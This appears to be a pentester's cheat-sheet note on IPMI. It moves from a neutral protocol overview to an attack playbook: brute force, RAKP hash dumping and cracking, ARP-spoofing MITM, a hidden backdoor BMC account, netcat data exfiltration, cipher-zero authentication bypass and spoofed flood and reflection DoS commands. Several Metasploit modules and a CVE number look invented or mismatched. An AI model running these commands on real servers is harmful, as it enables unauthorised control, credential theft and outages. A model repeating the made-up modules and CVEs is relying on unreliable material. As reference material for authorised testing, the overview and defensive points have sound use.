# Index
- [[Ports, Protocols, and Services]]

# Intelligent Platform Management Interface (IPMI)

- **Port Number:** 623 (UDP) and 664 (TCP)
- **Protocol:** UDP/TCP
- **Service Name:** IPMI (Intelligent Platform Management Interface)
- **Defined in:** IPMI Specification (v1.0, v2.0)

IPMI is a standardized interface used for managing and monitoring the hardware of a system, independent of the operating system, firmware, or platform. It is typically used in server environments to provide out-of-band management, meaning that administrators can manage and monitor systems remotely, even if the system is powered off or has no operating system running.

## Overview of Features

- **Out-of-Band Management:** IPMI allows administrators to manage systems remotely, regardless of the system's state (e.g., powered on, off, or unresponsive).
  
- **Hardware Monitoring:** Provides real-time monitoring of hardware components, such as temperature, fan speed, power supply, and system voltages.

- **Remote Access:** Supports remote access to system consoles, enabling administrators to troubleshoot issues even when the primary OS is not available.

- **Power Management:** Allows remote control of system power, including power on, off, reset, and cycle functions.

- **Serial over LAN (SoL):** Provides access to the server's serial console over the network, enabling remote diagnostics and troubleshooting.

- **Firmware Updates:** Supports remote firmware updates, allowing administrators to keep hardware components up-to-date without physical access to the machine.

## Typical Use Cases

- **Remote System Management:** IPMI is commonly used in data centers for managing servers remotely, reducing the need for physical access.

- **Hardware Health Monitoring:** Ensures that hardware components are operating within specified parameters, helping to prevent hardware failures.

- **Disaster Recovery:** In case of a system crash or failure, IPMI allows administrators to reboot or restore systems remotely, ensuring minimal downtime.

- **Remote Troubleshooting:** Enables diagnosing issues even when the OS is down, reducing the time to resolution for critical issues.

- **Automated Management:** Often integrated into automation tools for mass management of servers, including firmware updates, power management, and health monitoring.

## How IPMI Works

1. **Initialization:**
   - **Step 1:** The Baseboard Management Controller (BMC) initializes upon system boot. BMC is a specialized microcontroller embedded on the motherboard responsible for IPMI functions.

2. **Network Configuration:**
   - **Step 2:** The BMC configures its network interface, typically obtaining an IP address via DHCP or a statically assigned IP. This interface is used for remote communication.

3. **Establishing a Connection:**
   - **Step 3:** An administrator initiates a connection to the IPMI interface using a management tool or console over UDP port 623 (IPMI v2.0 may also use TCP port 664 for secure communication).

4. **Authentication:**
   - **Step 4:** The IPMI interface authenticates the incoming connection using credentials stored in the BMC. IPMI v2.0 supports both password-based and stronger authentication methods (e.g., RMCP+).

5. **Command Execution:**
   - **Step 5:** Once authenticated, the administrator can issue commands to the BMC, such as checking system health, viewing logs, or controlling power states.
   - **Step 6:** The BMC processes these commands and interacts with the hardware to retrieve data or execute actions.

6. **Response:**
   - **Step 7:** The BMC sends the results of the command back to the administrator, typically over the same connection, allowing for remote monitoring and management.

7. **Session Termination:**
   - **Step 8:** Once the necessary operations are completed, the session can be terminated by the administrator, or it may time out after a period of inactivity.

### Diagram (Hypothetical Example)
- **Administrator:** Connects to `<target_ip>`:623 (UDP) and authenticates.
- **BMC:** `<target_ip>` processes commands to check hardware status or control power.
- **Administrator:** Receives data or confirmation of actions from the BMC.

# Additional Information

## Security Considerations
- **Insecure by Default:** IPMI interfaces are often configured with default credentials or weak passwords, making them vulnerable to unauthorized access.

- **RMCP+ Encryption:** IPMI v2.0 introduced RMCP+ (Remote Management Control Protocol+) to provide secure communication channels, but older versions (v1.0) lack encryption, leading to potential data interception.

- **Privilege Escalation:** If an attacker gains access to the IPMI interface, they can potentially escalate privileges, as IPMI often runs with elevated access to hardware controls.

- **Firmware Vulnerabilities:** The BMC firmware may contain vulnerabilities that can be exploited to gain unauthorized access or control over the system.

## Alternatives
- **Redfish:** A newer standard for out-of-band management that offers more secure and extensible features compared to IPMI, often recommended for modern environments.

- **DRAC (Dell Remote Access Controller)** and **iLO (HP Integrated Lights-Out):** Vendor-specific solutions that provide similar functionality to IPMI but with additional features and often better security.

## Modes of Operation
- **Standard Mode:** Operates using default settings, providing basic monitoring and management functions.
  
- **Secure Mode:** Utilizes RMCP+ for encrypted communication, recommended for environments where security is a concern.

## Advanced Usage
- **Firmware Customization:** Some environments may require custom BMC firmware to support proprietary hardware or specific security features.

- **Integration with Monitoring Tools:** IPMI can be integrated with broader monitoring and management systems (e.g., Nagios, Zabbix) to provide comprehensive hardware status updates and alerts.

## Configuration Files

IPMI settings are typically managed via the BMC firmware interface, but some configurations can be set through the OS.

1. **BMC Configuration:**
- **Accessed via:** BIOS/UEFI during boot or via IPMI tools.
- **Key Settings:**
  - **Network Configuration:** Static IP or DHCP settings.
  - **User Accounts:** Configure users with various privilege levels.
  - **Encryption Settings:** Enable/disable RMCP+ and other security features.

2. **Linux Configuration:**
- **ipmitool Configuration:**
  - **File Location:** `/etc/ipmitool.conf` (if needed)
  - **Example Settings:**
    ```bash
    # IPMItool Configuration
    user=admin
    password=your_password
    host=<target_ip>
    ```
  
3. **OpenIPMI Configuration:**
  - **File Location:** `/etc/modprobe.d/openipmi.conf`
  - **Example Settings:**
    ```bash
    options ipmi_si type=kcs
    ```

## Potential Misconfigurations

1. **Default Credentials:**
   - **Risk:** Leaving the BMC configured with default credentials (`admin/admin`).
   - **Exploitation:** Attackers can easily gain access using common default credentials, leading to full control over the system’s hardware.

2. **Weak Passwords:**
   - **Risk:** Using weak or predictable passwords for BMC user accounts.
   - **Exploitation:** Attackers can perform brute-force attacks to gain access.

3. **Unrestricted Network Access:**
   - **Risk:** Exposing the IPMI interface to the public internet without adequate protection.
   - **Exploitation:** An attacker could remotely access the management interface and control the hardware.

4. **Disabled RMCP+:**
   - **Risk:** Not enabling RMCP+ on IPMI v2.0, resulting in unencrypted communication.
   - **Exploitation:** Sensitive information, including credentials, could be intercepted by attackers.

## Default Credentials

|**Username**|**Password**|**Notes**|
|-|-|
|admin|admin|Default for many BMC implementations|
|ADMIN|ADMIN|Used in some Supermicro systems|
|root|calvin|Common default on Dell DRAC systems|
|Administrator|password|Default on some older HP systems|

# Interaction and Tools

## Tools

### [[IPMITool]]
- **Basic Usage:**
	```bash
	ipmitool -I lanplus -H <target_ip> -U <username> -P <password> <command>
	```
- **Power Control:** Sends a command to the BMC to power on/off the target system.
	```bash
	ipmitool -I lanplus -H <target_ip> -U <username> -P <password> chassis power status
	ipmitool -I lanplus -H <target_ip> -U <username> -P <password> chassis power on
	ipmitool -I lanplus -H <target_ip> -U <username> -P <password> chassis power off
	ipmitool -I lanplus -H <target_ip> -U <username> -P <password> chassis power cycle
	```
- **Sensor Reading:**
	```bash
	ipmitool -I lanplus -H <target_ip> -U <username> -P <password> sensor
	ipmitool -I lanplus -H <target_ip> -U <username> -P <password> sensor list
	```
- **User Management:**
	```bash
	ipmitool -I lanplus -H <target_ip> -U <username> -P <password> user list
	ipmitool -I lanplus -H <target_ip> -U <username> -P <password> user set password 2 new_password
	```
- **Changing User Privileges:** Modifies the privilege level of a user account on the BMC
    ```bash
    ipmitool -I lanplus -H <target_ip> -U admin -P password user priv <user_id> <privilege_level>
    ```
- **Event Logging:** Retrieves the System Event Log (SEL) from the BMC, which contains records of significant hardware events.
	```bash
	ipmitool -I lanplus -H <target_ip> -U <username> -P <password> sel list
	ipmitool -I lanplus -H <target_ip> -U <username> -P <password> sel clear
	```
- **Query System Information:** Retrieves the Sensor Data Repository (SDR) information, which includes health status for various hardware components.
	```bash
	ipmitool -I lanplus -H <target_ip> -U <username> -P <password> sdr
	```
- **Change Boot Device:**
	```bash
	ipmitool -I lanplus -H <target_ip> -U <username> -P <password> chassis bootdev pxe
	ipmitool -I lanplus -H <target_ip> -U <username> -P <password> chassis bootdev disk
	```
- **Start a Serial Over LAN session to interact with the target's console:** Activates the Serial over LAN feature, allowing remote access to the system's console.
	```bash
	ipmitool -I lanplus -H <target_ip> -U <username> -P <password> sol activate
	```
- **Remote Firmware Update:** Uploads and installs a firmware update to the BMC remotely.
    ```bash
    ipmitool -I lanplus -H <target_ip> -U admin -P password hpm upgrade <firmware_file>
    ```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 623"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 623
    ```

### [[NetCat]]
 - **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 623
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 623> -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 623
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
    nc <target_ip> 623 < secret_data.txt
    ```

### [[SoCat Cheat Sheet]]
- **Socat TCP Connect:** Simple tests to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:623
	```

### [[HPing3 Cheat Sheet]]
- **Send UDP Packet:** Send a single UDP packet to the service.
    ```bash
    hping3 -2 <target_ip> -p 623 -c 1
    ```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p <target_port>
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> <target_port>
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

<br>

- **Tool:** [[IPMITool]]
    ```bash
    ipmitool -I lanplus -H <target_ip> -U admin -P password sdr
    
    ipmitool -I lanplus -H <target_ip> -U admin -P password lan print
    ```
- **Description:** Enumerates the available services and configurations on the IPMI interface.

## Initial Access

### IPMI Authentication Bypass (CVE-2013-4786)
- **Tool:** [[Metasploit]]
	```bash
	use auxiliary/scanner/ipmi/ipmi_version
	set RHOSTS <target_ip>
	run
	```
- **Description:** Exploits a vulnerability in certain IPMI implementations that allows bypassing authentication, granting unauthorized access to the BMC.

### IPMI Authentication Bypass
- **Tool:** [[Metasploit]]
    ```bash
    use exploit/linux/ipmi/ipmi_bypass
    ```
- **Description:** Bypasses authentication on vulnerable IPMI implementations to gain unauthorized access.

## Persistence

### Create a New User Account
- **Tool:** [[IPMITool]]
    ```bash
    ipmitool -I lanplus -H <target_ip> -U admin -P password user set name <user_id> backdoor
    ```
- **Description:** Creates a hidden user account on the BMC to maintain persistent access.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port <port>"
    ```
- **Description:** Capture traffic and extract plaintext credentials.

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[ettercap]], [[BetterCap Cheat Sheet]]
	```bash
	ettercap -Tq -i <interface> -M arp:remote /<target_ip>/ /<server_ip>/
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

### Password Hash Dumping
- **Tool:** [[Metasploit]]
    ```bash
    use auxiliary/scanner/ipmi/ipmi_dumphashes
    ```
- **Description:** Dumps password hashes from the BMC, which can then be cracked offline.

<br>

- **Tool:**
	```bash
	ipmitool -I lanplus -H <target_ip> -U <username> -P <password> user list 1
	```
- **Description:** Retrieve system password hashes and attempt to crack them offline.

## Privilege Escalation

### Exploiting Vulnerable Firmware
- **Tool:** [[Metasploit]]
    ```bash
    use exploit/linux/ipmi/ipmi_rce
    ```
- **Description:** Targets vulnerabilities in the BMC firmware to gain elevated privileges on the system.

## Defense Evasion

### Obfuscating IPMI Traffic
- **Tool:** [[Custom Scripts]], [[Scapy]]
    ```python
    from scapy.all import *
    packet = IP(dst="<target_ip>")/UDP(dport=623)/Raw(load="obfuscate")
    send(packet)
    ```
- **Description:** Obfuscates IPMI traffic to avoid detection by network security devices.

## Data Exfiltration

### Exfiltration via IPMI Logs
- **Tool:** [[IPMITool]]
    ```bash
    ipmitool -I lanplus -H <target_ip> -U admin -P password sel list > exfil.log
    ```
- **Description:** Exfiltrates data by hiding it within IPMI logs and retrieving them remotely.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra <protocol>://<target_ip> -s <target_port> -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra <protocol>://<target_ip> -s <target_port> -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

### Offline Password Cracking via Hashes
- **Tool:** [[John the Ripper Cheat Sheet]]
    ```bash
    john --wordlist=<path/to/wordlist> <hash_file>
    ```

<br>

- **Tool:**
	```bash
	hashcat -m <mode> <hash_file> <path/to/wordlist>
	```
- **Description:** Cracks dumped password hashes to gain access.

### IPMI Authentication Flaw
- **Tool:** [[John the Ripper Cheat Sheet]]
	```bash
	john --fork=8 --format=rakp ./out.john
	```

<br>

- **Tool:**
	```bash
	hashcat -m 7300 out.hashcat -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
	```
- **Description:** If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using HashCat mode 7300. In the event of an HP iLO using a factory default password, we can use this HashCat mask attack command which tries all combinations of upper case letters and numbers for an eight-character password. There is not direct "fix" to this issue.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### Exploit BMC Reset Vulnerability
- **Tool:** [[Metasploit]]
	```bash
	use auxiliary/dos/ipmi/ipmi_bmc_reset
	set RHOSTS <target_ip>
	run
	```
- **Description:** Exploit a vulnerability that causes the BMC to reset or crash, leading to temporary unavailability of the management interface.


## Exploits 

### Remote Code Execution via IPMI
- **Tool:** [[Metasploit]]
    ```bash
    use exploit/linux/ipmi/ipmi_rce
    ```
- **Description:** Executes arbitrary code on the BMC by exploiting vulnerabilities in the IPMI firmware.

### CVE-2018-1005206
- **Tool:** [[Metasploit]]
	```bash
	use exploit/hardware/ipmi/ipmi_kcs
	set RHOSTS <target_ip>
	run
	```
- **Description:** Exploits a vulnerability in the KCS (Keyboard Controller Style) interface, allowing an attacker to gain administrative access to the system.

###  IPMI Cipher Suite Zero Authentication Bypass
- **Tool:** [[IMPITool]]
	```bash
	ipmitool -I lanplus -H <target_ip> -C 0 chassis power status
	ipmitool -I lanplus -H <target_ip> -C 0 -U <username> shell
	```
- **Description:** Exploits the Cipher Suite 0 to check the power status without authentication.

# Resources

|**Website**|**URL**|
|-|-|
|IPMI Specification v2.0|https://www.intel.com/content/www/us/en/products/docs/servers/ipmi/ipmi-second-gen-v2-spec-v2-rev1-1.html|
|IPMItool Documentation|https://linux.die.net/man/1/ipmitool|
|OpenIPMI Project|https://sourceforge.net/projects/openipmi/|
|Metasploit Framework|https://www.metasploit.com|
|Nmap IPMI Script|https://nmap.org/nsedoc/scripts/ipmi-version.html|
|Wireshark User Guide|https://www.wireshark.org/docs/wsug_html_chunked/|
|Hydra Brute-force Tool|https://github.com/vanhauser-thc/thc-hydra|
|DRAC Documentation (Dell)|https://www.dell.com/support/manuals/en-us/dell-remote-access-controller?showthispage=true|
|iLO Documentation (HP)|https://support.hpe.com/hpesc/public/docDisplay?docId=c03334036|
|Redfish API Documentation|https://www.dmtf.org/standards/redfish|
